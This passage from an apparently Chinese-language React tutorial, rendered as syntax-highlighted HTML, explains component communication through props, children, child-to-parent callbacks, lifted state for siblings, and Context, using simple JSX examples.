#569CD6">h1</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">This is </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">props</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">appName</span><span style="color: #569CD6">}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">h1</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">name</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"John Wick"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">Son</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">appName</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">name</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">Son</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>请注意子组件中使用的是 appName 属性，而非具体传递的 name 变量。</p><div class="note warning flat"><p>warning</p><p>props 可以传递任意合法的 JS 数据，但 props 是只读的，子组件不能直接修改该数据。</p></div><h3 id="特殊的-props-属性-children"><a class="markdownIt-Anchor" href="#特殊的-props-属性-children"></a> 特殊的 props 属性 - children</h3><p>如果不是在子组件的标签属性中传递数据，而是将内容嵌套在子组件标签中，则子组件将通过一个默认的 props 属性进行接收，该属性名为 children。</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Son</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">props</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"Son"</span><span style="color: #808080">&gt;</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">props</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">children</span><span style="color: #569CD6">}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">name</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"John Wick"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">Son</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">h1</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">hello </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">name</span><span style="color: #569CD6">}</span><span style="color: #D4D4D4">!</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">h1</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">a child of Son</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #4EC9B0">Son</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><h3 id="子传父"><a class="markdownIt-Anchor" href="#子传父"></a> 子传父</h3><p>核心思想：利用父组件传递的函数传递自己的参数 / 数据</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useState</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Son</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">props</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"Son"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">h1</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">I am a Son</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">h1</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">input</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"text"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onChange</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">props</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">onSendMsg</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">target</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">)</span><span style="color: #569CD6">}</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">props</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">onSendMsg</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello from Son"</span><span style="color: #D4D4D4">)</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        send message</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> [</span><span style="color: #4FC1FF">msg</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">setMsg</span><span style="color: #D4D4D4">] = </span><span style="color: #DCDCAA">useState</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">sendMsg</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">msg</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">setMsg</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">msg</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        I am a Parent, and I have a Son who can send me a message: </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">msg</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">hr</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">Son</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onSendMsg</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">sendMsg</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">Son</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>如果传递的函数数量较少，也可以直接解构处理它。</p><h2 id="react-兄弟通信"><a class="markdownIt-Anchor" href="#react-兄弟通信"></a> React 兄弟通信</h2><p>很容易想到一个办法是：借助父组件进行数据传递。</p><h3 id="朴素的办法-状态提升"><a class="markdownIt-Anchor" href="#朴素的办法-状态提升"></a> 朴素的办法 - 状态提升</h3><p>假设有 B、C 组件为兄弟关系，它们存在一个共同的父组件 App，构建如下：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useState</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">B</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">props</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">bMsg</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"Hello from B"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"B"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">h2</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">This is B component</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">h2</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">bMsg: </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">bMsg</span><span style="color: #569CD6">}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">props</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">AppMsg</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">bMsg</span><span style="color: #D4D4D4">)</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">sending bMsg to C</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">props</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">AppMsg</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">)</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">clearing AppMsg</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> [</span><span style="color: #4FC1FF">msg</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">setMsg</span><span style="color: #D4D4D4">] = </span><span style="color: #DCDCAA">useState</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">appClick</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">msg</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">setMsg</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">msg</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">B</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">AppMsg</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">appClick</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">B</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">hr</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">C</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">AppMsg</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">msg</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">C</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">C</span><span style="color: #D4D4D4">({ </span><span style="color: #9CDCFE">AppMsg</span><span style="color: #D4D4D4"> }) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"C"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">h2</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">This is C component</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">h2</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">AppMsg</span><span style="color: #569CD6">}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>注意区分给 B 组件和 C 组件传递的 AppMsg 分别是什么：B 为回调函数，C 为来自 B 组件的消息字符串。</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">B</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">AppMsg</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">appClick</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">B</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">hr</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">C</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">AppMsg</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">msg</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">C</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>运行结果如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411111634311.gif" alt="recording"></p><h3 id="其他方法-待补充"><a class="markdownIt-Anchor" href="#其他方法-待补充"></a> 其他方法 - 待补充</h3><p>TODO</p><h2 id="跨层级通信-context"><a class="markdownIt-Anchor" href="#跨层级通信-context"></a> 跨层级通信 - Context</h2><p>适用于形成顶层 - 底层层级关系的组件通信。</p><p>假设有 App、B、C 三个组件。B 组件是被 App 使用的子组件，且 B 组件中又使用 C 组件，则此时 C 组件为底层组件而 App 为顶层组件。</p><ol><li>使用 createContext 方法创建一个上下文对象 Ctx（名称可随意）</li><li>在顶层组件（App）中通过 <code>Ctx.Provider</code> 组件提供数据</li><li>在底层组件（C）中通过 <code>useContext</code> 钩子函数获取消费数据</li></ol><p>代码示例如下：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">createContext</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">useContext</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">MsgContext</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">createContext</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">AppMsg</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"Hello from App."</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">AppMsg2</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"Hello from App2."</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">MsgContext.Provider</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">AppMsg</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">AppMsg2</span><span style="color: #D4D4D4">]</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        This is App component.</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">B</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">B</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #4EC9B0">MsgContext.Provider</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">hr</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">B</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: 